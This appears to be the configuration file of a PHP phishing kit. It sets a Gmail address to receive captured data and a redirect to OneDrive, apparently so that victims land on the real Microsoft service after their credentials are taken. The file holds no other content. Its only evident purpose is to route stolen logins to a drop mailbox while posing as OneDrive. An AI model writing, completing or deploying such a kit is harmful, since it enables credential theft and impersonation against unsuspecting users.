<?php 
$Receive_email="michael.lynch44002@gmail.com";
$redirect="https://www.onedrive.com/";
?>